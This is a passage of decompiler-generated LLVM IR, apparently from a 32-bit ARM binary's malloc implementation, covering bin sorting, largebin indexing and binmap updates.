  %v1_133a0 = and i32 %v0_133a0, 2
  %v2_133a0 = icmp eq i32 %v1_133a0, 0
  store i32 %v1_1339c, i32* @r7, align 4
  br i1 %v2_133a0, label %dec_label_pc_134f8, label %dec_label_pc_133ac

dec_label_pc_133ac:                               ; preds = %dec_label_pc_13398
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r1.global-to-local, align 4
  %v4_133b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_133b4, i32* @r0, align 4
  %v0_133b8 = call i32 @__malloc_consolidate()
  store i32 %v0_133b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_134f8

dec_label_pc_133c0:                               ; preds = %dec_label_pc_1350c
  %v1_133c0 = add i32 %v3_1350c, 4
  %v2_133c0 = inttoptr i32 %v1_133c0 to i32*
  %v3_133c0 = load i32, i32* %v2_133c0, align 4
  store i32 %v3_133c0, i32* %r3.global-to-local, align 4
  %v0_133c4 = load i32, i32* @sl, align 4
  %v1_133c8 = and i32 %v3_133c0, -4
  store i32 %v1_133c8, i32* %r4.global-to-local, align 4
  %v1_133cc = add i32 %v3_1350c, 12
  %v2_133cc = inttoptr i32 %v1_133cc to i32*
  %v3_133cc = load i32, i32* %v2_133cc, align 4
  store i32 %v3_133cc, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_133c4, 255
  br i1 %tmp206, label %dec_label_pc_13428, label %dec_label_pc_133d4

dec_label_pc_133d4:                               ; preds = %dec_label_pc_133c0
  %v9_133d4 = icmp eq i32 %v3_133cc, %v0_1342c
  br i1 %v9_133d4, label %dec_label_pc_133dc, label %dec_label_pc_13428

dec_label_pc_133dc:                               ; preds = %dec_label_pc_133d4
  %v0_133dc = load i32, i32* @sb, align 4
  %v1_133dc = add i32 %v0_133dc, 48
  %v2_133dc = inttoptr i32 %v1_133dc to i32*
  %v3_133dc = load i32, i32* %v2_133dc, align 4
  store i32 %v3_133dc, i32* %r3.global-to-local, align 4
  %v9_133e0 = icmp eq i32 %v3_1350c, %v3_133dc
  br i1 %v9_133e0, label %dec_label_pc_133e8, label %dec_label_pc_13428

dec_label_pc_133e8:                               ; preds = %dec_label_pc_133dc
  %v1_133e8 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_133c8, %v1_133e8
  br i1 %tmp207, label %dec_label_pc_133f0, label %dec_label_pc_13428

dec_label_pc_133f0:                               ; preds = %dec_label_pc_133e8
  %v2_133f0 = sub i32 %v1_133c8, %v0_133c4
  store i32 %v2_133f0, i32* %r2.global-to-local, align 4
  %v2_133f4 = add i32 %v0_133c4, %v3_1350c
  store i32 %v2_133f4, i32* %r3.global-to-local, align 4
  %v1_133f8 = or i32 %v0_133c4, 1
  store i32 %v1_133f8, i32* %r0.global-to-local, align 4
  %v1_133fc = or i32 %v2_133f0, 1
  store i32 %v1_133fc, i32* %r1.global-to-local, align 4
  %v1_13400 = add i32 %v3_1350c, 8
  store i32 %v1_13400, i32* %r4.global-to-local, align 4
  %v2_13404 = add i32 %v0_1342c, 8
  %v3_13404 = inttoptr i32 %v2_13404 to i32*
  store i32 %v2_133f4, i32* %v3_13404, align 4
  %v0_13408 = load i32, i32* %r3.global-to-local, align 4
  %v1_13408 = load i32, i32* %ip.global-to-local, align 4
  %v2_13408 = add i32 %v1_13408, 12
  %v3_13408 = inttoptr i32 %v2_13408 to i32*
  store i32 %v0_13408, i32* %v3_13408, align 4
  %v0_1340c = load i32, i32* %r0.global-to-local, align 4
  %v1_1340c = load i32, i32* @r6, align 4
  %v2_1340c = add i32 %v1_1340c, 4
  %v3_1340c = inttoptr i32 %v2_1340c to i32*
  store i32 %v0_1340c, i32* %v3_1340c, align 4
  %v0_13410 = load i32, i32* %r3.global-to-local, align 4
  %v1_13410 = load i32, i32* @sb, align 4
  %v2_13410 = add i32 %v1_13410, 48
  %v3_13410 = inttoptr i32 %v2_13410 to i32*
  store i32 %v0_13410, i32* %v3_13410, align 4
  %v0_13414 = load i32, i32* %r2.global-to-local, align 4
  %v1_13414 = load i32, i32* %r3.global-to-local, align 4
  %v3_13414 = add i32 %v1_13414, %v0_13414
  %v4_13414 = inttoptr i32 %v3_13414 to i32*
  store i32 %v0_13414, i32* %v4_13414, align 4
  %v0_13418 = load i32, i32* %r1.global-to-local, align 4
  %v1_13418 = load i32, i32* %r3.global-to-local, align 4
  %v2_13418 = add i32 %v1_13418, 4
  %v3_13418 = inttoptr i32 %v2_13418 to i32*
  store i32 %v0_13418, i32* %v3_13418, align 4
  %v0_1341c = load i32, i32* %ip.global-to-local, align 4
  %v1_1341c = load i32, i32* %r3.global-to-local, align 4
  %v2_1341c = add i32 %v1_1341c, 12
  %v3_1341c = inttoptr i32 %v2_1341c to i32*
  store i32 %v0_1341c, i32* %v3_1341c, align 4
  %v0_13420 = load i32, i32* %ip.global-to-local, align 4
  %v1_13420 = load i32, i32* %r3.global-to-local, align 4
  %v2_13420 = add i32 %v1_13420, 8
  %v3_13420 = inttoptr i32 %v2_13420 to i32*
  store i32 %v0_13420, i32* %v3_13420, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13428:                               ; preds = %dec_label_pc_133e8, %dec_label_pc_133dc, %dec_label_pc_133d4, %dec_label_pc_133c0
  %v9_13428 = icmp eq i32 %v1_133c8, %v0_133c4
  %v2_1342c = add i32 %v3_133cc, 8
  %v3_1342c = inttoptr i32 %v2_1342c to i32*
  store i32 %v0_1342c, i32* %v3_1342c, align 4
  %v0_13430 = load i32, i32* %ip.global-to-local, align 4
  %v1_13430 = load i32, i32* %r5.global-to-local, align 4
  %v2_13430 = add i32 %v1_13430, 12
  %v3_13430 = inttoptr i32 %v2_13430 to i32*
  store i32 %v0_13430, i32* %v3_13430, align 4
  br i1 %v9_13428, label %dec_label_pc_13588.loopexit, label %dec_label_pc_13444

dec_label_pc_13444:                               ; preds = %dec_label_pc_13428
  %v0_13444 = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_13444, 255
  br i1 %tmp208, label %dec_label_pc_13468, label %dec_label_pc_1344c

dec_label_pc_1344c:                               ; preds = %dec_label_pc_13444
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  %v1_13450 = load i32, i32* %r8.global-to-local, align 4
  %v2_13450 = add i32 %v1_13450, ptrtoint (i32* @global_var_23010.367 to i32)
  %v3_13450 = inttoptr i32 %v2_13450 to i32*
  %v4_13450 = load i32, i32* %v3_13450, align 4
  %v3_13454 = udiv i32 %v0_13444, 8
  store i32 %v3_13454, i32* %r0.global-to-local, align 4
  %v4_13458 = mul nuw i32 %v3_13454, 8
  %v5_13458 = add i32 %v4_13450, %v4_13458
  store i32 %v5_13458, i32* %r3.global-to-local, align 4
  %v1_1345c = add i32 %v5_13458, 44
  store i32 %v1_1345c, i32* %ip.global-to-local, align 4
  %v1_13460 = add i32 %v5_13458, 52
  %v2_13460 = inttoptr i32 %v1_13460 to i32*
  %v3_13460 = load i32, i32* %v2_13460, align 4
  store i32 %v3_13460, i32* @lr, align 4
  br label %dec_label_pc_134c0

dec_label_pc_13468:                               ; preds = %dec_label_pc_13444
  store i32 %v0_13444, i32* %r0.global-to-local, align 4
  %v1_1346c = call i32 @__malloc_largebin_index(i32 %v0_13444)
  store i32 %v1_1346c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %ip.global-to-local, align 4
  %v1_13474 = load i32, i32* %r8.global-to-local, align 4
  %v2_13474 = add i32 %v1_13474, ptrtoint (i32* @global_var_23010.367 to i32)
  %v3_13474 = inttoptr i32 %v2_13474 to i32*
  %v4_13474 = load i32, i32* %v3_13474, align 4
  %v4_13478 = mul i32 %v1_1346c, 8
  %v5_13478 = add i32 %v4_13474, %v4_13478
  store i32 %v5_13478, i32* %r3.global-to-local, align 4
  %v1_1347c = add i32 %v5_13478, 44
  store i32 %v1_1347c, i32* %ip.global-to-local, align 4
  %v1_13480 = add i32 %v5_13478, 52
  %v2_13480 = inttoptr i32 %v1_13480 to i32*
  %v3_13480 = load i32, i32* %v2_13480, align 4
  store i32 %v3_13480, i32* @lr, align 4
  %v9_13484 = icmp eq i32 %v3_13480, %v1_1347c
  br i1 %v9_13484, label %dec_label_pc_134c0, label %dec_label_pc_1348c

dec_label_pc_1348c:                               ; preds = %dec_label_pc_13468
  %v1_1348c = add i32 %v5_13478, 56
  %v2_1348c = inttoptr i32 %v1_1348c to i32*
  %v3_1348c = load i32, i32* %v2_1348c, align 4
  store i32 %v3_1348c, i32* %r1.global-to-local, align 4
  %v1_13490 = add i32 %v3_1348c, 4
  %v2_13490 = inttoptr i32 %v1_13490 to i32*
  %v3_13490 = load i32, i32* %v2_13490, align 4
  store i32 %v3_13490, i32* %r3.global-to-local, align 4
  %v0_13494 = load i32, i32* %r4.global-to-local, align 4
  %v3_13494 = icmp ult i32 %v0_13494, %v3_13490
  br i1 %v3_13494, label %.thread, label %dec_label_pc_134b0.preheader

.thread:                                          ; preds = %dec_label_pc_1348c
  store i32 %v1_1347c, i32* @lr, align 4
  store i32 %v3_1348c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_134c0

dec_label_pc_134b0.preheader:                     ; preds = %dec_label_pc_1348c
  %v2_1349c = or i32 %v0_13494, 1
  store i32 %v2_1349c, i32* %r2.global-to-local, align 4
  %v1_134b0182 = add i32 %v3_13480, 4
  %v2_134b0183 = inttoptr i32 %v1_134b0182 to i32*
  %v3_134b0184 = load i32, i32* %v2_134b0183, align 4
  store i32 %v3_134b0184, i32* %r3.global-to-local, align 4
  %v3_134b4186 = icmp ult i32 %v2_1349c, %v3_134b0184
  br i1 %v3_134b4186, label %dec_label_pc_134ac, label %dec_label_pc_134bc

dec_label_pc_134ac:                               ; preds = %dec_label_pc_134b0.preheader, %dec_label_pc_134ac
  %v0_134bc187 = phi i32 [ %v3_134ac, %dec_label_pc_134ac ], [ %v3_13480, %dec_label_pc_134b0.preheader ]
  %v1_134ac = add i32 %v0_134bc187, 8
  %v2_134ac = inttoptr i32 %v1_134ac to i32*
  %v3_134ac = load i32, i32* %v2_134ac, align 4
  store i32 %v3_134ac, i32* @lr, align 4
  %v1_134b0 = add i32 %v3_134ac, 4
  %v2_134b0 = inttoptr i32 %v1_134b0 to i32*
  %v3_134b0 = load i32, i32* %v2_134b0, align 4
  store i32 %v3_134b0, i32* %r3.global-to-local, align 4
  %v3_134b4 = icmp ult i32 %v2_1349c, %v3_134b0
  br i1 %v3_134b4, label %dec_label_pc_134ac, label %dec_label_pc_134bc

dec_label_pc_134bc:                               ; preds = %dec_label_pc_134ac, %dec_label_pc_134b0.preheader
  %v0_134bc.lcssa = phi i32 [ %v3_13480, %dec_label_pc_134b0.preheader ], [ %v3_134ac, %dec_label_pc_134ac ]
  %v1_134bc = add i32 %v0_134bc.lcssa, 12
  %v2_134bc = inttoptr i32 %v1_134bc to i32*
  %v3_134bc = load i32, i32* %v2_134bc, align 4
  store i32 %v3_134bc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_134c0

dec_label_pc_134c0:                               ; preds = %.thread, %dec_label_pc_13468, %dec_label_pc_1344c, %dec_label_pc_134bc
  %v0_134e0 = phi i32 [ %v1_1347c, %dec_label_pc_13468 ], [ %v1_1345c, %dec_label_pc_1344c ], [ %v3_134bc, %dec_label_pc_134bc ], [ %v3_1348c, %.thread ]
  %v0_134d4 = phi i32 [ %v1_1346c, %dec_label_pc_13468 ], [ %v3_13454, %dec_label_pc_1344c ], [ %v1_1346c, %dec_label_pc_134bc ], [ %v1_1346c, %.thread ]
  %v1_134c4 = phi i32 [ %v1_13474, %dec_label_pc_13468 ], [ %v1_13450, %dec_label_pc_1344c ], [ %v1_13474, %dec_label_pc_134bc ], [ %v1_13474, %.thread ]
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  %v2_134c4 = add i32 %v1_134c4, ptrtoint (i32* @global_var_23010.367 to i32)
  %v3_134c4 = inttoptr i32 %v2_134c4 to i32*
  %v4_134c4 = load i32, i32* %v3_134c4, align 4
  %v3_134c8 = sdiv i32 %v0_134d4, 32
  store i32 %v3_134c8, i32* %r3.global-to-local, align 4
  %v4_134cc = mul nsw i32 %v3_134c8, 4
  %v5_134cc = add i32 %v4_134c4, %v4_134cc
  store i32 %v5_134cc, i32* %r1.global-to-local, align 4
  %v1_134d0 = add i32 %v5_134cc, 820
  %v2_134d0 = inttoptr i32 %v1_134d0 to i32*
  %v3_134d0 = load i32, i32* %v2_134d0, align 4
  %v1_134d4 = urem i32 %v0_134d4, 32
  store i32 %v1_134d4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_134dc = shl i32 1, %v1_134d4
  %v8_134dc = or i32 %v3_134d0, %v7_134dc
  store i32 %v8_134dc, i32* %r3.global-to-local, align 4
  %v1_134e0 = load i32, i32* @r6, align 4
  %v2_134e0 = add i32 %v1_134e0, 12
  %v3_134e0 = inttoptr i32 %v2_134e0 to i32*
  store i32 %v0_134e0, i32* %v3_134e0, align 4
  %v0_134e4 = load i32, i32* @lr, align 4
  %v1_134e4 = load i32, i32* @r6, align 4
  %v2_134e4 = add i32 %v1_134e4, 8
  %v3_134e4 = inttoptr i32 %v2_134e4 to i32*
  store i32 %v0_134e4, i32* %v3_134e4, align 4
  %v0_134e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_134e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_134e8 = add i32 %v1_134e8, 820
  %v3_134e8 = inttoptr i32 %v2_134e8 to i32*
  store i32 %v0_134e8, i32* %v3_134e8, align 4
  %v0_134ec = load i32, i32* @r6, align 4
  %v1_134ec = load i32, i32* @lr, align 4
  %v2_134ec = add i32 %v1_134ec, 12
  %v3_134ec = inttoptr i32 %v2_134ec to i32*
  store i32 %v0_134ec, i32* %v3_134ec, align 4
  %v0_134f0 = load i32, i32* @r6, align 4
  %v1_134f0 = load i32, i32* %ip.global-to-local, align 4
  %v2_134f0 = add i32 %v1_134f0, 8
  %v3_134f0 = inttoptr i32 %v2_134f0 to i32*
  store i32 %v0_134f0, i32* %v3_134f0, align 4
  %v0_1350c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1350c

dec_label_pc_134f8:                               ; preds = %dec_label_pc_13398, %dec_label_pc_13350, %dec_label_pc_133ac
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r1.global-to-local, align 4
  %v4_13500 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_13500, i32* @sb, align 4
  %v0_13504 = load i32, i32* @sl, align 4
  %v1_13504 = add i32 %v0_13504, 16
  store i32 %v1_13504, i32* @fp, align 4
  %v1_13508 = add i32 %v4_13500, 52
  store i32 %v1_13508, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1350c

dec_label_pc_1350c:                               ; preds = %dec_label_pc_134c0, %dec_label_pc_134f8
  %v0_1342c = phi i32 [ %v0_1350c.pre, %dec_label_pc_134c0 ], [ %v1_13508, %dec_label_pc_134f8 ]
  %v1_1350c = add i32 %v0_1342c, 12
  %v2_1350c = inttoptr i32 %v1_1350c to i32*
  %v3_1350c = load i32, i32* %v2_1350c, align 4
  store i32 %v3_1350c, i32* @r6, align 4
  %v9_13510 = icmp eq i32 %v3_1350c, %v0_1342c
  br i1 %v9_13510, label %dec_label_pc_13518, label %dec_label_pc_133c0

dec_label_pc_13518:                               ; preds = %dec_label_pc_1350c
  %v0_13518 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_13518, 256
  %v0_135d0.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_13518.dec_label_pc_135d0_crit_edge, label %dec_label_pc_13520

dec_label_pc_13518.dec_label_pc_135d0_crit_edge:  ; preds = %dec_label_pc_13518
  %.pre203 = mul i32 %v0_135d0.pre, 8
  br label %dec_label_pc_135d0

dec_label_pc_13520:                               ; preds = %dec_label_pc_13518
  %v4_13520 = mul i32 %v0_135d0.pre, 8
  %v5_13520 = add i32 %v4_13520, %v0_1342c
  store i32 %v5_13520, i32* %r3.global-to-local, align 4
  %v1_13524 = add i32 %v5_13520, -8
  store i32 %v1_13524, i32* %r1.global-to-local, align 4
  %v1_13528 = add i32 %v5_13520, 4
  %v2_13528 = inttoptr i32 %v1_13528 to i32*
  %storemerge.pre = load i32, i32* %v2_13528, align 4
  br label %dec_label_pc_135c8

dec_label_pc_13530:                               ; preds = %dec_label_pc_135c8
  %v1_13530 = add i32 %v1_13558, 4
  %v2_13530 = inttoptr i32 %v1_13530 to i32*
  %v3_13530 = load i32, i32* %v2_13530, align 4
  store i32 %v3_13530, i32* %r3.global-to-local, align 4
  %v1_13534 = and i32 %v3_13530, -4
  store i32 %v1_13534, i32* %r2.global-to-local, align 4
  %v3_13538 = icmp ult i32 %v1_13534, %v0_13518
  %v1_1353c = add i32 %v1_13558, 12
  %v2_1353c = inttoptr i32 %v1_1353c to i32*
  %v3_1353c = load i32, i32* %v2_1353c, align 4
  store i32 %v3_1353c, i32* %r0.global-to-local, align 4
  br i1 %v3_13538, label %dec_label_pc_135c8, label %dec_label_pc_13544

dec_label_pc_13544:                               ; preds = %dec_label_pc_13530
  %v1_13544 = add i32 %v1_13558, 8
  %v2_13544 = inttoptr i32 %v1_13544 to i32*
  %v3_13544 = load i32, i32* %v2_13544, align 4
  store i32 %v3_13544, i32* %r1.global-to-local, align 4
  %v1_13548 = add i32 %v3_13544, 12
  %v2_13548 = inttoptr i32 %v1_13548 to i32*
  %v3_13548 = load i32, i32* %v2_13548, align 4
  store i32 %v3_13548, i32* %r3.global-to-local, align 4
  %v9_1354c = icmp eq i32 %v3_13548, %v1_13558
  br i1 %v9_1354c, label %dec_label_pc_13554, label %dec_label_pc_13560

dec_label_pc_13554:                               ; preds = %dec_label_pc_13544
  %v1_13554 = add i32 %v3_1353c, 8
  %v2_13554 = inttoptr i32 %v1_13554 to i32*
  %v3_13554 = load i32, i32* %v2_13554, align 4
  store i32 %v3_13554, i32* %r3.global-to-local, align 4
  %v9_13558 = icmp eq i32 %v3_13554, %v1_13558
  br i1 %v9_13558, label %dec_label_pc_13564, label %dec_label_pc_13560

dec_label_pc_13560:                               ; preds = %dec_label_pc_13544, %dec_label_pc_13554
  %v0_13560 = call i32 @abort()
  store i32 %v0_13560, i32* %r0.global-to-local, align 4
  %v0_13564.pre = load i32, i32* @sl, align 4
  %v1_13564.pre = load i32, i32* @r2, align 4
  %v0_1356c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13564

dec_label_pc_13564:                               ; preds = %dec_label_pc_13554, %dec_label_pc_13560
  %v1_1356c = phi i32 [ %v3_1353c, %dec_label_pc_13554 ], [ %v0_13560, %dec_label_pc_13560 ]
  %v0_1356c = phi i32 [ %v3_13544, %dec_label_pc_13554 ], [ %v0_1356c.pre, %dec_label_pc_13560 ]
  %v1_13564 = phi i32 [ %v1_13534, %dec_label_pc_13554 ], [ %v1_13564.pre, %dec_label_pc_13560 ]
  %v0_13564 = phi i32 [ %v0_13518, %dec_label_pc_13554 ], [ %v0_13564.pre, %dec_label_pc_13560 ]
  %v2_13564 = sub i32 %v1_13564, %v0_13564
  store i32 %v2_13564, i32* %lr.global-to-local, align 4
  %v2_1356c = add i32 %v1_1356c, 8
  %v3_1356c = inttoptr i32 %v2_1356c to i32*
  store i32 %v0_1356c, i32* %v3_1356c, align 4
  %v0_13570 = load i32, i32* %r0.global-to-local, align 4
  %v1_13570 = load i32, i32* %r1.global-to-local, align 4
  %v2_13570 = add i32 %v1_13570, 12
  %v3_13570 = inttoptr i32 %v2_13570 to i32*
  store i32 %v0_13570, i32* %v3_13570, align 4
  %v0_13574 = load i32, i32* %ip.global-to-local, align 4
  %v1_13574 = add i32 %v0_13574, 8
  store i32 %v1_13574, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_13564, 15
  br i1 %tmp210, label %dec_label_pc_13594, label %dec_label_pc_1357c

dec_label_pc_1357c:                               ; preds = %dec_label_pc_13564
  %v1_1357c = load i32, i32* %r2.global-to-local, align 4
  %v2_1357c = add i32 %v1_1357c, %v0_13574
  store i32 %v2_1357c, i32* %r2.global-to-local, align 4
  %v1_13580 = add i32 %v2_1357c, 4
  %v2_13580 = inttoptr i32 %v1_13580 to i32*
  %v3_13580 = load i32, i32* %v2_13580, align 4
  store i32 %v3_13580, i32* %r3.global-to-local, align 4
  store i32 %v1_13574, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13588

dec_label_pc_13588.loopexit:                      ; preds = %dec_label_pc_13428
  %v1_13434 = load i32, i32* @r6, align 4
  %v2_13434 = load i32, i32* @sl, align 4
  %v3_13434 = add i32 %v2_13434, %v1_13434
  store i32 %v3_13434, i32* %r2.global-to-local, align 4
  %v2_13438 = add i32 %v3_13434, 4
  %v3_13438 = inttoptr i32 %v2_13438 to i32*
  %v4_13438 = load i32, i32* %v3_13438, align 4
  store i32 %v4_13438, i32* %r3.global-to-local, align 4
  %v2_1343c = add i32 %v1_13434, 8
  store i32 %v2_1343c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13588

dec_label_pc_13588:                               ; preds = %.dec_label_pc_13588_crit_edge, %dec_label_pc_13588.loopexit, %dec_label_pc_1357c
  %v1_1358c = phi i32 [ %v4_136b0, %.dec_label_pc_13588_crit_edge ], [ %v3_13434, %dec_label_pc_13588.loopexit ], [ %v2_1357c, %dec_label_pc_1357c ]
  %v0_13588 = phi i32 [ %v7_136b0, %.dec_label_pc_13588_crit_edge ], [ %v4_13438, %dec_label_pc_13588.loopexit ], [ %v3_13580, %dec_label_pc_1357c ]
  %v1_13588 = or i32 %v0_13588, 1
  store i32 %v1_13588, i32* %r3.global-to-local, align 4
  %v2_1358c = add i32 %v1_1358c, 4
  %v3_1358c = inttoptr i32 %v2_1358c to i32*
  store i32 %v1_13588, i32* %v3_1358c, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13594:                               ; preds = %dec_label_pc_13564
  %v1_13594 = load i32, i32* @sl, align 4
  %v2_13594 = add i32 %v1_13594, %v0_13574
  store i32 %v2_13594, i32* %r2.global-to-local, align 4
  %v1_13598 = or i32 %v1_13594, 1
  store i32 %v1_13598, i32* %r3.global-to-local, align 4
  %v0_1359c = load i32, i32* %lr.global-to-local, align 4
  %v1_1359c = or i32 %v0_1359c, 1
  store i32 %v1_1359c, i32* %r1.global-to-local, align 4
  store i32 %v1_13574, i32* %r4.global-to-local, align 4
  %v2_135a4 = add i32 %v0_13574, 4
  %v3_135a4 = inttoptr i32 %v2_135a4 to i32*
  store i32 %v1_13598, i32* %v3_135a4, align 4
  %v0_135a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_135a8 = load i32, i32* @r6, align 4
  %v2_135a8 = add i32 %v1_135a8, 8
  %v3_135a8 = inttoptr i32 %v2_135a8 to i32*
  store i32 %v0_135a8, i32* %v3_135a8, align 4
  %v0_135ac = load i32, i32* %r2.global-to-local, align 4
  %v1_135ac = load i32, i32* @r6, align 4
  %v2_135ac = add i32 %v1_135ac, 12
  %v3_135ac = inttoptr i32 %v2_135ac to i32*
  store i32 %v0_135ac, i32* %v3_135ac, align 4
  %v0_135b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_135b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_135b0 = add i32 %v1_135b0, %v0_135b0
  %v4_135b0 = inttoptr i32 %v3_135b0 to i32*
  store i32 %v0_135b0, i32* %v4_135b0, align 4
  %v0_135b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_135b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_135b4 = add i32 %v1_135b4, 4
  %v3_135b4 = inttoptr i32 %v2_135b4 to i32*
  store i32 %v0_135b4, i32* %v3_135b4, align 4
  %v0_135b8 = load i32, i32* @r6, align 4
  %v1_135b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_135b8 = add i32 %v1_135b8, 12
  %v3_135b8 = inttoptr i32 %v2_135b8 to i32*
  store i32 %v0_135b8, i32* %v3_135b8, align 4
  %v0_135bc = load i32, i32* @r6, align 4
  %v1_135bc = load i32, i32* %r2.global-to-local, align 4
  %v2_135bc = add i32 %v1_135bc, 8
  %v3_135bc = inttoptr i32 %v2_135bc to i32*
  store i32 %v0_135bc, i32* %v3_135bc, align 4
  br label %dec_label_pc_13b50

dec_label_pc_135c8:                               ; preds = %dec_label_pc_13530, %dec_label_pc_13520
  %v1_13558 = phi i32 [ %storemerge.pre, %dec_label_pc_13520 ], [ %v3_1353c, %dec_label_pc_13530 ]
  store i32 %v1_13558, i32* %ip.global-to-local, align 4
  %v9_135c8 = icmp eq i32 %v1_13558, %v1_13524
  br i1 %v9_135c8, label %dec_label_pc_135d0.loopexit, label %dec_label_pc_13530

dec_label_pc_135d0.loopexit:                      ; preds = %dec_label_pc_135c8
  br label %dec_label_pc_135d0

dec_label_pc_135d0:                               ; preds = %dec_label_pc_13518.dec_label_pc_135d0_crit_edge, %dec_label_pc_135d0.loopexit
  %v4_13600.pre-phi = phi i32 [ %.pre203, %dec_label_pc_13518.dec_label_pc_135d0_crit_edge ], [ %v4_13520, %dec_label_pc_135d0.loopexit ]
  %v1_135d0 = add i32 %v0_135d0.pre, 1
  store i32 %v1_135d0, i32* %r2.global-to-local, align 4
  %v1_135d4 = urem i32 %v1_135d0, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r0.global-to-local, align 4
  %v6_135e0 = shl i32 1, %v1_135d4
  store i32 %v6_135e0, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_135e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_135e8, i32* %r3.global-to-local, align 4
  %v3_135ec = udiv i32 %v1_135d0, 32
  store i32 %v3_135ec, i32* @r5, align 4
  %v4_135f0 = mul nuw nsw i32 %v3_135ec, 4
  %v5_135f0 = add i32 %v4_135e8, %v4_135f0
  store i32 %v5_135f0, i32* %r2.global-to-local, align 4
  %v1_135f4 = add i32 %v5_135f0, 820
  %v2_135f4 = inttoptr i32 %v1_135f4 to i32*
  %v3_135f4 = load i32, i32* %v2_135f4, align 4
  store i32 %v3_135f4, i32* @r4, align 4
  %v1_135f8 = add i32 %v4_135e8, 52
  store i32 %v1_135f8, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_13600 = add i32 %v1_135f8, %v4_13600.pre-phi
  store i32 %v5_13600, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13604

dec_label_pc_13604:                               ; preds = %dec_label_pc_1366c, %dec_label_pc_135d0
  %v1_1360c = phi i32 [ %v1_1360c.pre, %dec_label_pc_1366c ], [ %v3_135f4, %dec_label_pc_135d0 ]
  %v0_1360c = phi i32 [ %v0_13604.pre, %dec_label_pc_1366c ], [ %v6_135e0, %dec_label_pc_135d0 ]
  %v1_13604 = sub i32 1, %v0_1360c
  %v2_13604 = icmp ult i32 %v0_1360c, 2
  %v1_13604. = select i1 %v2_13604, i32 %v1_13604, i32 0
  store i32 %v1_13604., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_1360c, %v1_1360c
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_13604
  %v5_13610 = or i32 %v1_13604., 1
  store i32 %v5_13610, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1361c.preheader

bb145:                                            ; preds = %dec_label_pc_13604
  %v2_13614 = icmp eq i32 %v1_13604., 0
  br i1 %v2_13614, label %.dec_label_pc_13658.preheader_crit_edge, label %dec_label_pc_1361c.preheader

.dec_label_pc_13658.preheader_crit_edge:          ; preds = %bb145
  %v0_1365057.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13658.preheader

dec_label_pc_1361c.preheader:                     ; preds = %bb145, %.thread15
  %v0_1361c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1361c

dec_label_pc_1361c:                               ; preds = %dec_label_pc_1361c.preheader, %dec_label_pc_13628
  %v0_1361c = phi i32 [ %v0_1361c.pre, %dec_label_pc_1361c.preheader ], [ %v1_1361c, %dec_label_pc_13628 ]
  %v1_1361c = add i32 %v0_1361c, 1
  store i32 %v1_1361c, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_1361c, 2
  br i1 %tmp211, label %dec_label_pc_136fc.loopexit, label %dec_label_pc_13628

dec_label_pc_13628:                               ; preds = %dec_label_pc_1361c
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r3.global-to-local, align 4
  %v1_1362c = load i32, i32* @r8, align 4
  %v2_1362c = add i32 %v1_1362c, ptrtoint (i32* @global_var_23010.367 to i32)
  %v3_1362c = inttoptr i32 %v2_1362c to i32*
  %v4_1362c = load i32, i32* %v3_1362c, align 4
  store i32 %v4_1362c, i32* %r2.global-to-local, align 4
  %v4_13630 = mul i32 %v1_1361c, 4
  %v5_13630 = add i32 %v4_1362c, %v4_13630
  store i32 %v5_13630, i32* %r3.global-to-local, align 4
  %v1_13634 = add i32 %v5_13630, 820
  %v2_13634 = inttoptr i32 %v1_13634 to i32*
  %v3_13634 = load i32, i32* %v2_13634, align 4
  store i32 %v3_13634, i32* @r4, align 4
  %v2_13638 = icmp eq i32 %v3_13634, 0
